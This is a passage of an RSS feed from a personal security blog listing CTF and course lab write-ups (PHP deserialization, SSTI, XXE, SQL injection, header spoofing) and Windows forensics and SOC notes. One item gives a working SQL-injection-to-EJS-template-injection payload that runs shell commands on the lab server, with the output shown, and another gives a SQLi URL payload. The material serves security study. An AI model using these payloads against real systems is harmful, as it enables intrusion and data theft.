isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</guid><description>Simple Web 0x19(Lab - PHP Login) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8081
Background Source code &lt;?php // BSides Ahmedabad CTF 2021: entrance include 'flag.php'; $users = array( "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352", "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450" ); function lookup($username) { global $users; return array_key_exists($username, $users) ? $users[$username] : ""; } if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { $sha1pass = lookup($_POST['username']); if ($sha1pass == sha1($_POST['password'])) { if ($_POST['username'] !== 'guest') echo $FLAG; else echo 'Welcome guest!'; } else { echo 'Login Failed!'; } } else { echo "You can login with guest:guest"; } echo "&lt;br>\n"; highlight_file(__file__); ?> Exploit Must change GET method to POST method and add Content-Type: application/x-www-form-urlencoded in header</description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</guid><description>Simple Web 0x22(Lab - Pug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8008
Source code :::spoiler
const express = require('express'); const pug = require('pug'); const app = express(); const template = ` h1 Hello %NAME% form(method='GET' action='https://bernie6401.github.io/') div label(for='nickname') Name: input#nickname(type='text', placeholder='Nickname' name='name') button(type='submit') Submit a(href='https://bernie6401.github.io/source') Source Code `; app.get('/', (req, res) => { const name = (req.query.name ?? 'Anonymous').toString(); if (name.includes('{')) return res.send('Nice try'); let html = pug.render(template.replace('%NAME%', name)); res.set('Content-Type', 'text/html'); res.send(html); }); app.get("/source", (_, res) => { res.sendFile(__filename); }); app.listen(3000, () => console.log(':3000')); :::</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</guid><description>Simple Web 0x24(Lab - how2http) Source code &lt;?php show_source(__FILE__); include("flag.php"); if (!empty($_SERVER["HTTP_CLIENT_IP"])){ $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } if ($_COOKIE['user'] !== 'admin') die("Not admim"); if( $_SERVER["REQUEST_METHOD"] !== "FLAG" ) die("u don't need flag?"); if ($ip === "127.0.0.1") echo $FLAG; else echo "NOPE!"; ?> Recon 主要是參考之前寫過的PicoCTF - Who are you?和PicoCTF - Who are you?，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==
Exploit</description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html</guid><description>Simple Web 0x41(2023 HW - Double Injection - FLAG1) Background Time Based SQLi :::info 建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便 :::
Source code :::spoiler init-db.js
const fs = require('fs'); const sqlite3 = require('sqlite3').verbose(); const FLAG1 = fs.readFileSync('/flag1.txt', 'utf8').trim(); const db = new sqlite3.Database('/etc/db.sqlite3'); db.exec(` DROP TABLE IF EXISTS users; CREATE TABLE db ( users JSON NOT NULL ); INSERT INTO db(users) VALUES ('{ "admin": { "username": "admin", "password": "${FLAG1}" }, "guest": { "username": "guest", "password": "guest" } }'); `); ::: :::spoiler Dockerfile</description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html</guid><description>Simple Web 0x42(2023 HW - Double Injection - FLAG2) Background Node JS ejs SSTI
Source code 呈上題
Recon 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like: 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:
admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # 後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看之前寫的文章
Exploit - Ejs SSTI RCE Payload 1: Username: admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # &lt;%= global.process.mainModule.require("child_process").execSync("ls -al /").toString() %> Password: FLAG{sqlite_js0n_inject!on} Result: total	76	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	-rwxr-xr-x	1	root	root	0	Dec	18	18:54	.dockerenv	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	drwxr-xr-x	5	root	root	340	Dec	18	18:54	dev	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	-rw-r--r--	1	root	root	28	Dec	18	17:15	flag1.txt	-rw-r--r--	1	root	root	23	Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	dr-xr-xr-x	497	root	root	0	Dec	18	18:54	proc	drwx------	1	root	root	4096	Dec	11	18:36	root	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	dr-xr-xr-x	13	root	root	0	Dec	18	18:54	sys	drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	Payload 2: Username: admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # &lt;%= global.process.mainModule.require("child_process").execSync("cat /flag2-1PRmDsTXoo3uPCdq.txt").toString() %> Password: FLAG{sqlite_js0n_inject!on} Result: FLAG{ezzzzz_sqli2ssti} Flag: FLAG{ezzzzz_sqli2ssti}</description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html</guid><description>Simple Welcome - 0x04(Lab - Script) tags: CTF Web eductf Challenge: https://pyscript.ctf.zoolab.org/
Source Code &lt;?php if(!isset($_FILES["file"])) highlight_file(__file__) &amp;&amp; die(); $flag = file_get_contents('/flag'); $node = @`node {$_FILES["file"]["tmp_name"]} 2>&amp;1`; $python = @`python3 {$_FILES["file"]["tmp_name"]} 2>&amp;1`; if($flag === $node &amp;&amp; $flag === $python) echo 'Here is your Flag: '.$flag; else echo 'Fail :('; ?> Analysis Must write a script that can be executed in python and node language simultaneously.
Exploit - Using comment In python The comment is # for single line and ''' for multi lines In node The comment is // for single line and /**/ for multi lines Using different definition of comment to write script Some tips: a = 1 // 1; b = '''''' Both of these instruction are valid in python Whole payload Python</description></item><item><title>Simple Welcome 0x01(Lab - Let's meet at class)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/index.html</guid><description>Simple Welcome 0x01(Lab - Let’s meet at class) Description Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It’s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can… (Use pip3 install pycryptodome to install Crypto)
Source Code :::spoiler Source
from Crypto.Util.number import bytes_to_long, getPrime import random import math import os from secret import FLAG FLAG += os.urandom(128 - len(FLAG)) flag = bytes_to_long(FLAG) p = getPrime(1024) keys = [pow(random.randint(1000 * i + 2, 1000 * (i+1) ), 65537, p) for i in range(5)] enc = flag for i in range(5): enc = enc * keys[i] % p hint = keys[0] ^ keys[1] ^ keys[2] ^ keys[3] ^ keys[4] print('p =', p) print('enc =', enc) print('hint =', hint) ::: :::spoiler</description></item><item><title>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html</guid><description>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge) Background Convert.FromBase64String(String) Method in C# String.Substring 方法
Source Code :::spoiler C# From dnSpy
// Nine.Stage // Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894 private void Flag() { this.font = new Font(this.fontFamily, 35f, FontStyle.Regular); byte[] array = Convert.FromBase64String("LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=".Replace("pui", "").Substring(1)); for (int i = 0; i &lt; array.Length; i++) { array[i] ^= 135; } this.SetMessageBox(Encoding.UTF8.GetString(array)); } :::
Recon 起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼 我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析.NET file，這一題也是看了別人的WP1才知道有dnSpy這東西可以用 執行程式 實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西 用dnSpy看source code 在/Nine/Nine.exe/Nine/Stage@02000004/Flag()以及/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單 :::spoiler Function Path Screenshot ::: Exploit 也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script</description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</guid><description>SQLi - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 Exp Payload: https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20# :::spoiler Success Screenshot :::</description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - ArcSight教學</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/index.html</guid><description>TaiwanHolyHigh - SoC基礎維運 - ArcSight教學 Set Up 先進到https://bit.ly/44IFecN下載ArcSight Console，並且全部default下一步
(editor需要admin權限)進入localhost host DNS解析 -> C:\Windows\System32\drivers\etc\host 新增 211.75.237.80 chtpoc 打開ArcSight Console，用之前提供的帳密以及最後打chtpoc，進行登入 登入之後的狀態 ArcSight預設有分大小寫</description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - HW2</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/index.html</guid><description>TaiwanHolyHigh - SoC基礎維運 - HW2 Background Sysmon Event ID 事件識別碼 1：處理程序建立 處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 ProcessGUID 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 HashType 欄位中的演算法。
事件識別碼 8：CreateRemoteThread CreateRemoteThread 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、StartModule 和 StartFunction。 請注意，系統會推斷 StartModule 和 StartFunction 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。
事件識別碼 11：FileCreate 建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。
事件識別碼 13：RegistryEvent (值已設定) 此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 DWORD 和 QWORD 的登錄值所寫入的值。
Recon - Event Log呈現的攻擊順序 Event ID: 8 → CreateRemoteThread 首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉 比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的reflective dll injection，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process</description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Background</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - $MFT Background :::spoiler TOC [TOC] ::: :::info 以下引用若無特別說明皆來自於講師的上課簡報 :::
Background $在windows代表系統檔案 $MFT(Master File Table): FAT(File Allocation Table): Fat 檔案系統，簡稱 File Allocation Table，是微軟和 Caldera 開發組為 Windows 電腦開發的檔案系統 雖然它主要是電腦磁區類型，但在過去幾年中它已作為主要檔案系統格式用於各種手機裝置中。此外，由於它是一個 8 位檔案系統，因此簇數會隨著磁碟容量的增加而增加。 FAT12 - 12 位 FAT16 - 16 位 FAT32 - 32 位 我們還應該澄清，FAT 檔案系統從 1977 年開始使用，但 FAT32 是在 1996 年引入的
BIOS(Basic Input Output System) POST(Power On Self Test) POST自檢測過程大致為：加電－CPU－ROM－BIOS－System Clock－DMA－64KB RAM－IRQ－顯卡等。檢測顯卡以前的過程稱過關鍵部件測試，如果關鍵部件有問題，計算機會處於掛起狀態，習慣上稱為核心故障。另一類故障稱為非關鍵性故障，檢測完顯卡後，計算機將對64KB以上內存、I／O口、軟硬盤驅動器、鍵盤、即插即用設備、CMOS設置等進行檢測，並在屏幕上顯示各種信息和出錯報告。在正常情況下，POST過程進行得非常快，我們幾乎無法感覺到這個過程。 POST自檢測代碼含義是什麼？ 當系統檢測到相應的錯誤時，會以兩種方式進行報告，即在屏幕上顯示出錯信息或以報警聲響次數的方式來指出檢測到的故障。
MBR(Master Boot Record) MBR 代表主開機記錄。它是一小段代碼，負責在您的電腦上加載作業系統。 MBR 還包含有關硬碟上的分割區及佈局的資訊。如果您曾經安裝過作業系統，您可能會看到詢問您是否要以 MBR 或 GPT 模式安裝它的提示。這是指硬碟上使用的分割區類型。</description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File :::spoiler TOC [TOC] :::
Background $MFT儲存的內容
==Status== ==$MFT Record==(File Identify/Location) ==Timestamp== Standard Info Filename ==Resident== 特性如下: $SO\ne 0$: 意思就是resident file的前面一定有其他檔案，而他一定不會是$MFT的開頭 No File Slack: 沒有檔案暫存區，意味著他會住在一個剛剛好的大小的房間中 Physical Size = Logical Size: 這個就和前一個有相關，logical size就是實際住進去房間的檔案大小，而physical size就是飯店給予我們房間的大小，所以$physical_size\ge logical_size$ 如果resident file因為駭客的攻擊(injection/trojan/backdoor…)使得檔案大小變大，而失去原本resident file的身分，則該檔案就會被搬出目前的地方，就算之後檔案大小變回來，還是無法再住回原本的地方，這就是攻擊方所遺留的攻擊痕跡 如何判斷?如果檔名後面接的是18 00 00 00 01 00就是resident file，例如： :::spoiler 範例 ::: 或者是看18 00 00 00 10 00的前面第二個byte(就是non-resident flag)，是00代表不是non-resident file，反之就是 :::spoiler flag範例 ::: 檔案大小 18 00 00 00 10 00後面接著的四個bytes就是檔案大小$\to$換成10禁制就對了，另外如果此檔案是resident file，則檔案大小後面除了固定的18 00 00 00以外，後面還會有該檔案原本的file signature，以此為例就是89 50 4E 47也就是png的magical header :::spoiler flag範例 此範例就是02 02$\to$514 bytes ::: ==non-Resident File== 如果是non-resident file，檔名的後面一點會接的是80 00 00 00 48 00 00 00，再後面就是non-resident flag 另外，檔案的大小會在flag往後數40個bytes的地方，以底下範例來說就是F6 09 00 00 Lab - Resident File Lab - Offset 43208704(d) 先找檔名，後面會跟著18 00 00 00 01 00，前面會有non-resident flag(前面第二個byte)，再後面會跟著檔案大小D0 01，再後面一點會跟著原本這個file的signature</description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT 基本實作</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - $MFT 基本實作 :::spoiler TOC [TOC] ::: :::info 以下引用若無特別說明皆來自於講師的上課簡報 :::
Background $MFT儲存的內容 ==Status==: SO=22, LE=2，也就是目前此檔案的狀態，分為以下四種 0000: Delete File 0100: File 0200: Delete Folder 0300: Folder ==$MFT Record==(File Identify/Location): SO=44, LE=4，也就是此檔案在record在$MFT的位置在哪邊 ==Timestamp== Standard Info: SO=80, LE=32(Creat+Modified+$MFT Modified+Access)，很容易就可以更改，如果要更改，可以參考New Filetime這個工具 Filename: SO=184, LE=32(Creat+Modified+$MFT Modified+Access) 很難被更改(但還是可以更改) ==Resident / non-Resident File== 下一篇詳細說明 :::info 以下三個練習都是Resident File :::
Lab - Offset 43110400(d) $MFT長度一段就是1024 Bytes，我把結束的位址減掉開頭的位置就知道了，或是可以直接用HxD底下看長度(0x400) >>> 0x291D400-0x291D000 1024 從上圖也可以看到magical word就是FILE0$\to$46 49 4C 45 30 Overview(從上到下)</description></item><item><title>TaiwanHolyHigh - Windows Forensics - Background</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - Background [TOC]
Background ==資安事件的流程== Prepare 建立Infra 購買ISO(e.g. ISO 27001) SPA(資安健診) Predict Threat Intelligence(威脅情資) Recon(情蒐) Monitor(監控) 搜尋Pattern Identify(識別): 有興趣可以看這一篇論文筆記DeepCase SOC(資安監控中心) IDS: 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動 IPS: IThelp - Active Defense Audit: AD常常遇到 EDR Code Review Prevent: 防禦攻擊 Firewall(Layer 4 - Transport) WAF(Layer 7 - Application) DLP(資料外洩防護) Incident Profile: 這個項目比較能夠得到一些惡意的行為，而該行為一定脫離不了下面三點 Purpose/Payload(有可能是Data, Source, 或金錢等等) Path(透過甚麼途徑達成目的，有可能是USB, 社交工程, 0-day) Behavior(建立帳戶/開service/與C&amp;C連線等等) Incident Response Restore(主動) Recovery(被動) Isolate Deter: 主動式的阻絕 Inside Outside(就是找外援通常是執法單位) law enforcement(執法單位) Forensics Triage: 做分流的動作 揮發性資料(RAM…) Network Process System Artifacts(registry/log/temp…) Duplicate(Image): 製作證據的映像檔$\to$非揮發性的資料 RAW Image Evidence File Forensics Analysis 已知項目(Known) Keyword Hash Baseline Recovery Signature Sorting Artifact LNK Prefetch SPL Thumbnail Registry(非揮發性) Log Recycle Bin ==網路攻擊鍊(Cyber Kill Chain)== 詳細資料: TeamT5 - Cyber Kill Chain</description></item><item><title>TaiwanHolyHigh - Windows Forensics - LNK Lab</title><link>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/index.html</guid><description>TaiwanHolyHigh - Windows Forensics - LNK Lab [TOC]
:::info 以下引用若無特別說明皆來自於講師的上課簡報 :::
Background What is .LNK? LNK 檔為 Windows 系統中，執行程式或開啟檔案後會留存的捷徑檔，該檔案內會有相當多的資訊
Where is .LNK? 預設 LNK 檔案會放在使用者目錄下，可透過以下指令檢視：$ dir c:\Users\{username}\*.lnk /b /s :::spoiler 執行結果
$ dir c:\Users\Bernie\*.lnk /b /s c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group1\1 - Desktop.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group2\1 - Run.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group2\2 - Search.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group2\3 - Windows Explorer.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group2\4 - Control Panel.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group2\5 - Task Manager.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\01a - Windows PowerShell.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\02a - Windows PowerShell.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\03 - Computer Management.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\04 - Disk Management.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\04-1 - NetworkStatus.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\05 - Device Manager.lnk c:\Users\Bernie\AppData\Local\Microsoft\Windows\WinX\Group3\06 - SystemAbout.lnk 